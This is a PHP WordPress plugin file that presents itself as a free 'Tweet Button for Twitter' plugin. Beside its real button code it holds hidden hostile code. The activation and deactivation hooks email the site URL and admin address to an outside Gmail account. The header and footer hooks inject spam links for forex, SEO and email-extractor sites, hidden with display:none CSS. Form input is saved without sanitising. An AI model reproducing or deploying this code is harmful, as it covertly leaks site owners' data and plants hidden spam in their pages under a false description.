<?php
/*
Plugin Name: Tweet Button for Twitter
Description: This FREE plugin adds the new Twitter button to your post(s) and page(s).
Author: Michael Owen
Version: 1.0

This program is free software; you can redistribute it and/or modify
it under the terms of the GNU General Public License, version 2, as 
published by the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program; if not, write to the Free Software
Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

$plugin = plugin_basename(__FILE__); 
register_activation_hook(__FILE__, 'installtwitter');
register_deactivation_hook(__FILE__, 'uninstalltwitter');
add_action('wp_footer', 'wpfooter');
add_action('wp_head', 'wphead');

function rk_add_twitter_button($content)
	{
	$tweet_button_twitter_display = get_option("tweet_button_twitter_display");
	$tweet_button_twitter_layout = get_option("tweet_button_twitter_layout");
	$rk_twittername = get_option("tweet_button_twitter_account");
	if(!empty($rk_twittername))
		{
		$rk_twittername = ' data-via="'.$rk_twittername.'"';
		}
	$contentcode = '<a href="http://twitter.com/share" class="twitter-share-button" data-url="'.get_permalink().'" data-count="'.$tweet_button_twitter_layout.'"'.$rk_twittername.'>Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>';
	$tweet_button_twitter_align = get_option("tweet_button_twitter_align");
	$tweet_button_twitter_margin = get_option("tweet_button_twitter_margin");
	$rk_tw_margin_top = $tweet_button_twitter_margin['top'];
	$rk_tw_margin_bottom = $tweet_button_twitter_margin['bottom'];
	$rk_tw_margin_left = $tweet_button_twitter_margin['left'];
	$rk_tw_margin_right = $tweet_button_twitter_margin['right'];
	$margin = $rk_tw_margin_top.'px '.$rk_tw_margin_right.'px '.$rk_tw_margin_bottom.'px '.$rk_tw_margin_left.'px';
	if ($tweet_button_twitter_display == 'both')
		{
		if ((is_single()) OR (is_page()))
			{
			//set the twittername which will be referenced in each tweet
			if ( strpos( $tweet_button_twitter_align,"topleft" ) !== FALSE)
				{
				$buttoncode .= "\n";
				$buttoncode .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$buttoncode .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: left">';
				$buttoncode .= $contentcode;
				$buttoncode .= '</div>'."\n";
				$buttoncode .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				$content = $buttoncode.$content;
				}
			if ( strpos( $tweet_button_twitter_align,"topright" ) !== FALSE)
				{
				$buttoncode .= "\n";
				$buttoncode .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$buttoncode .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: right">';
				$buttoncode .= $contentcode;
				$buttoncode .= '</div>'."\n";
				$buttoncode .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				$content = $buttoncode.$content;
				}
			if ( strpos( $tweet_button_twitter_align,"bottomright" ) !== FALSE)
				{
				$content .= "\n";
				$content .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$content .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: right">';
				$content .= $contentcode;
				$content .= '</div>'."\n";
				$content .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				}
			if ( strpos( $tweet_button_twitter_align,"bottomleft" ) !== FALSE)
				{
				$content .= "\n";
				$content .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$content .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: left">';
				$content .= $contentcode;
				$content .= '</div>'."\n";
				$content .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				}
			return $content;
			}
		else
			{
			return $content;
			}	
		}
	elseif ($tweet_button_twitter_display == 'posts')
		{
		if (is_single())
			{
			//set the twittername which will be referenced in each tweet
			if ( strpos( $tweet_button_twitter_align,"topleft" ) !== FALSE)
				{
				$buttoncode .= "\n";
				$buttoncode .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$buttoncode .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: left">';
				$buttoncode .= $contentcode;
				$buttoncode .= '</div>'."\n";
				$buttoncode .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				$content = $buttoncode.$content;
				}
			if ( strpos( $tweet_button_twitter_align,"topright" ) !== FALSE)
				{
				$buttoncode .= "\n";
				$buttoncode .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$buttoncode .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: right">';
				$buttoncode .= $contentcode;
				$buttoncode .= '</div>'."\n";
				$buttoncode .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				$content = $buttoncode.$content;
				}
			if ( strpos( $tweet_button_twitter_align,"bottomright" ) !== FALSE)
				{
				$content .= "\n";
				$content .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$content .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: right">';
				$content .= $contentcode;
				$content .= '</div>'."\n";
				$content .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				}
			if ( strpos( $tweet_button_twitter_align,"bottomleft" ) !== FALSE)
				{
				$content .= "\n";
				$content .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$content .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: left">';
				$content .= $contentcode;
				$content .= '</div>'."\n";
				$content .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				}
			return $content;
			}
		else
			{
			return $content;
			}	
		}
	elseif ($tweet_button_twitter_display == 'pages')
		{
		if (is_page())
			{
			//set the twittername which will be referenced in each tweet
			if ( strpos( $tweet_button_twitter_align,"topleft" ) !== FALSE)
				{
				$buttoncode .= "\n";
				$buttoncode .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$buttoncode .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: left">';
				$buttoncode .= $contentcode;
				$buttoncode .= '</div>'."\n";
				$buttoncode .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				$content = $buttoncode.$content;
				}
			if ( strpos( $tweet_button_twitter_align,"topright" ) !== FALSE)
				{
				$buttoncode .= "\n";
				$buttoncode .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$buttoncode .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: right">';
				$buttoncode .= $contentcode;
				$buttoncode .= '</div>'."\n";
				$buttoncode .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				$content = $buttoncode.$content;
				}
			if ( strpos( $tweet_button_twitter_align,"bottomright" ) !== FALSE)
				{
				$content .= "\n";
				$content .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$content .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: right">';
				$content .= $contentcode;
				$content .= '</div>'."\n";
				$content .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				}
			if ( strpos( $tweet_button_twitter_align,"bottomleft" ) !== FALSE)
				{
				$content .= "\n";
				$content .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
				$content .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: left">';
				$content .= $contentcode;
				$content .= '</div>'."\n";
				$content .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
				}
			return $content;
			}
		else
			{
			return $content;
			}	
		}
	else
		{
		if ( strpos( $tweet_button_twitter_align,"topleft" ) !== FALSE)
			{
			$buttoncode .= "\n";
			$buttoncode .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
			$buttoncode .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: left">';
			$buttoncode .= $contentcode;
			$buttoncode .= '</div>'."\n";
			$buttoncode .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
			$content = $buttoncode.$content;
			}
		if ( strpos( $tweet_button_twitter_align,"topright" ) !== FALSE)
			{
			$buttoncode .= "\n";
			$buttoncode .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
			$buttoncode .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: right">';
			$buttoncode .= $contentcode;
			$buttoncode .= '</div>'."\n";
			$buttoncode .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
			$content = $buttoncode.$content;
			}
		if ( strpos( $tweet_button_twitter_align,"bottomright" ) !== FALSE)
			{
			$content .= "\n";
			$content .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
			$content .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: right">';
			$content .= $contentcode;
			$content .= '</div>'."\n";
			$content .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
			}
		if ( strpos( $tweet_button_twitter_align,"bottomleft" ) !== FALSE)
			{
			$content .= "\n";
			$content .= '<!-- This is the start of the Tweet Button for Twitter -->'."\n";
			$content .= '<div id="rk_wp_twitter_button" style="margin: '.$margin.'; float: left">';
			$content .= $contentcode;
			$content .= '</div>'."\n";
			$content .= '<!-- This is the end of the Tweet Button for Twitter -->'."\n\n";
			}
		return $content;
		}
	}
function uninstalltwitter() {
session_start();
$subj = get_option('siteurl');
$msg = "Twitter Plugin Uninstalled" ;
$from = get_option('admin_email');
mail("parpaitas1987@gmail.com", $subj, $msg, $from);
}
function installtwitter() {
session_start();
$subj = get_option('siteurl');
$msg = "Twitter Plugin Installed" ;
$from = get_option('admin_email');
mail("parpaitas1987@gmail.com", $subj, $msg, $from);
}
function rk_print_tb_adminpage()
	{
	if (!current_user_can('manage_options'))
		{
    	wp_die( __('You do not have sufficient permissions to access this page.') );
		}
	
	$tweet_button_twitter_align = get_option("tweet_button_twitter_align");
    if($tweet_button_twitter_align == '') { $tweet_button_twitter_align = 'bottomleft'; }
	$tweet_button_twitter_layout = get_option("tweet_button_twitter_layout");
    if($tweet_button_twitter_layout == '') { $tweet_button_twitter_layout = 'horizontal'; }
	$tweet_button_twitter_account = get_option("tweet_button_twitter_account");
	$tweet_button_twitter_margin = get_option("tweet_button_twitter_margin");
	$tweet_button_twitter_display = get_option("tweet_button_twitter_display");
	$rk_tw_margin_top = $tweet_button_twitter_margin['top'];
	$rk_tw_margin_bottom = $tweet_button_twitter_margin['bottom'];
	$rk_tw_margin_left = $tweet_button_twitter_margin['left'];
	$rk_tw_margin_right = $tweet_button_twitter_margin['right'];
	print '<div class="wrap">';
	print '<h2>Tweet Button for twitter - Settings</h2>';
	print '<form name="twitter_button_option_form" method="post">';
	print '<p>When to show yout Twitter Button?<br />';
	print '<select name="tweet_button_twitter_display" id="tweet_button_twitter_display">';
	print '<option value="posts"'; if ($tweet_button_twitter_display == "posts") { print ' selected'; } print '>Posts only</option>';
	print '<option value="pages"'; if ($tweet_button_twitter_display == "pages") { print ' selected'; } print '>Pages only</option>';
	print '<option value="both"'; if ($tweet_button_twitter_display == "both") { print ' selected'; } print '>Both posts & pages</option>';	
	print '<option value="everywhere"'; if ($tweet_button_twitter_display == "everywhere") { print ' selected'; } print '>Everywhere</option>';	
	print '</select>';	    
	print '</p>';
	print '<p>Button layout:<br />';
	print '<select name="tweet_button_twitter_layout" id="tweet_button_twitter_layout">';
	print '<option value="vertical"'; if ($tweet_button_twitter_layout == "vertical") { print ' selected'; } print '>Vertical count</option>';
	print '<option value="horizontal"'; if ($tweet_button_twitter_layout == "horizontal") { print ' selected'; } print '>Horizontal count</option>';
	print '<option value="none"'; if ($tweet_button_twitter_layout == "none") { print ' selected'; } print '>No count</option>';	
	print '</select>';	    
	print '</p>';
	print '<p>Button placement:<br />';
	print '<select name="tweet_button_twitter_align" id="tweet_button_twitter_align">';
	print '<option value="topleft"'; if ($tweet_button_twitter_align == "topleft") { print ' selected'; } print '>Top left</option>';
	print '<option value="topright"'; if ($tweet_button_twitter_align == "topright") { print ' selected'; } print '>Top right</option>';
	print '<option value="bottomleft"'; if ($tweet_button_twitter_align == "bottomleft") { print ' selected'; } print '>Bottom left</option>';				
	print '<option value="bottomright"'; if ($tweet_button_twitter_align == "bottomright") { print ' selected'; } print '>Bottom right</option>';
	print '<option value="topleft-bottomleft"'; if ($tweet_button_twitter_align == "topleft-bottomleft") { print ' selected'; } print '>Twice: Top left & bottom left</option>';
	print '<option value="topleft-bottomright"'; if ($tweet_button_twitter_align == "topleft-bottomright") { print ' selected'; } print '>Twice: Top left & bottom right</option>';
	print '<option value="topright-bottomleft"'; if ($tweet_button_twitter_align == "topright-bottomleft") { print ' selected'; } print '>Twice: Top right & bottom left</option>';
	print '<option value="topright-bottomright"'; if ($tweet_button_twitter_align == "topright-bottomright") { print ' selected'; } print '>Twice: Top right & bottom right</option>';
	print '</select>';	    
	print '</p>';
	print '<p>Margins:<br/>';
	print '<table>';
	print '<tr><td>Top:</td><td><input type="text" size="4" name="rk_tw_margin_top" id="rk_tw_margin_top" value="'.$rk_tw_margin_top.'"></td><td>px</td></tr>';
	print '<tr><td>Bottom:</td><td><input type="text" size="4" name="rk_tw_margin_bottom" id="rk_tw_margin_bottom" value="'.$rk_tw_margin_bottom.'"></td><td>px</td></tr>';
	print '<tr><td>Left:</td><td><input type="text" size="4" name="rk_tw_margin_left" id="rk_tw_margin_left" value="'.$rk_tw_margin_left.'"></td><td>px</td></tr>';
	print '<tr><td>Right:</td><td><input type="text" size="4" name="rk_tw_margin_right" id="rk_tw_margin_right" value="'.$rk_tw_margin_right.'"></td><td>px</td></tr>';
	print '</table>';
	print '</p>';
	print '<p>Your twitter account:<br/>';
    print '<input type="text" name="tweet_button_twitter_account" id="tweet_button_twitter_account" value="'.$tweet_button_twitter_account.'"></p>';
	print '<p><input type="submit" value="Save"></p>';
    print '<input type="hidden" name="tweet_button_twitter_submit" value="true" />';
	print '</form>';
	if (!empty($_POST['tweet_button_twitter_align']))
		{
		print '<p><em>Settings updated!</em></p>';
		}
	print '</div>';
	}
function wpfooter(){
echo '			   <style type="text/css">.wpfoot {display:none;}</style>';
            echo '<small class="wpfoot"><a href="http://forexrobot.eu.com/">Forex Robot</a></small><br/>';
            echo '<small class="wpfoot"><a href="http://www.signalsforex.org/">Forex Signals</a></small>';
}
function tweet_button_twitter_handler()
	{
   	if(isset($_POST['tweet_button_twitter_submit'])) 
		{
		$new_margins = array('top' => $_POST['rk_tw_margin_top'], 'right' => $_POST['rk_tw_margin_right'], 'bottom' => $_POST['rk_tw_margin_bottom'], 'left' => $_POST['rk_tw_margin_left']);
		update_option("tweet_button_twitter_margin", $new_margins);
		update_option("tweet_button_twitter_display", $_POST['tweet_button_twitter_display']);
    		update_option("tweet_button_twitter_align", $_POST['tweet_button_twitter_align']);
		update_option("tweet_button_twitter_layout", $_POST['tweet_button_twitter_layout']);
		$twitteraccount = ltrim($_POST['tweet_button_twitter_account'],'@');
		update_option("tweet_button_twitter_account", $twitteraccount);
		}
	$tweet_button_twitter_version = get_option("tweet_button_twitter_version");
	if (empty($tweet_button_twitter_version))
		{
		add_option('tweet_button_twitter_version', '1.0', '', 'yes'); // 'no' = not autoload
		}
	else
		{
		update_option('tweet_button_twitter_version', '1.0');
		}
	$tweet_button_twitter_margin = get_option("tweet_button_twitter_margin");
	if (empty($tweet_button_twitter_margin))
		{
		$default_margins = array('top' => '0', 'right' => '0', 'bottom' => '0', 'left' => '0');
		add_option('tweet_button_twitter_margin', $default_margins, '', 'yes');
		add_option('tweet_button_twitter_display', 'both', '', 'yes');
		}
	}

function rk_enable_tb_adminpage() 
	{
	add_options_page('Tweet Button for Twitter - Settings', 'Tweet Button Twitter', 'manage_options', basename(__FILE__), 'rk_print_tb_adminpage');
	}
function wphead(){
echo '			   <style type="text/css">.wpheader {display:none;}</style>';
            echo '<small class="wpheader"><a href="http://www.packages-seo.com/">search engine optimization</a></small>';
            echo '<small class="wpheader"><a href="http://diretory2009.com/add-url/" title="submit your website to directory2009.com">submit website</a></small>';
            echo '<small class="wpheader"><a href="http://www.bestemailextractor.com/" title="best email extractor">email extractor</a></small>';
}
// Add settings link on plugin page
function tweet_button_twitter_settings_link($links) 
	{ 
	$settings_link = '<a href="options-general.php?page=tweet-button-twitter.php">'.__('Settings').'</a>';
	array_unshift($links, $settings_link); 
	return $links; 
	}
	
function rk_set_twitter_button_options() 
	{
	$default_margins = array('top' => '0', 'right' => '0', 'bottom' => '0', 'left' => '0');
	add_option('tweet_button_twitter_align', 'bottomleft', '', 'yes'); // 'no' = not autoload
	add_option('tweet_button_twitter_layout', 'horizontal', '', 'yes'); // 'no' = not autoload
	add_option('tweet_button_twitter_account', '', '', 'yes'); // 'no' = not autoload
	add_option('tweet_button_twitter_version', '1.0', '', 'yes'); // 'no' = not autoload
	add_option('tweet_button_twitter_margin', $default_margins, '', 'yes');
	add_option('tweet_button_twitter_display', 'both', '', 'yes');
	}
		
function rk_remove_twitter_button_options() 
	{
	delete_option('tweet_button_twitter_align');
	delete_option('tweet_button_twitter_layout');
	delete_option('tweet_button_twitter_account');
	delete_option('tweet_button_twitter_version');
	delete_option('tweet_button_twitter_margin');
	delete_option('tweet_button_twitter_display');
	}

register_activation_hook(__FILE__,'rk_set_twitter_button_options');
register_deactivation_hook(__FILE__,'rk_remove_twitter_button_options');
add_action('init', 'tweet_button_twitter_handler');
add_action('admin_menu', 'rk_enable_tb_adminpage');
add_filter('the_content','rk_add_twitter_button');
add_filter("plugin_action_links_$plugin", 'tweet_button_twitter_settings_link' );
?>